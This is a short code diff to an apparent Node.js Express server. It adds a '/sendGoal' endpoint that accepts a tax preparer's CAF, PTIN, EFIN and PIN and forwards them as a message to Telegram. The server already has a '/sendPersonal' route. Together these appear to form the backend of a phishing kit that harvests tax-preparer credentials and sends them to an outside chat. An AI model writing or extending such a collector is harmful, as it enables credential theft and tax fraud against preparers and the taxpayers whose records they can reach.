@@ -135,6 +135,25 @@ app.post('/sendPersonal', async (req, res, next) => {
     next(error);
   }
 });
+app.post('/sendGoal', async (req, res, next) => {
+  const { caf, ptin, efin, pin } = req.body;
+
+  if (!caf || !ptin || !efin || !pin) {
+    return res.status(400).json({ success: false, message: "Missing required fields" });
+  }
+
+  const message = `📌 GOAL INFO:\nCAF: ${caf}\nPTIN: ${ptin}\nEFIN: ${efin}\nPIN: ${pin}`;
+
+  try {
+    await sendTelegramMessage(message); // your Telegram logic
+    res.status(200).json({ success: true, message: "Goal info sent to Telegram" });
+  } catch (error) {
+    console.error('Error sending goal:', error.response?.data || error.message);
+    next(error);
+  }
+});
+
+
 
 // Catch-all for unmatched routes - JSON response
 app.use((req, res) => {
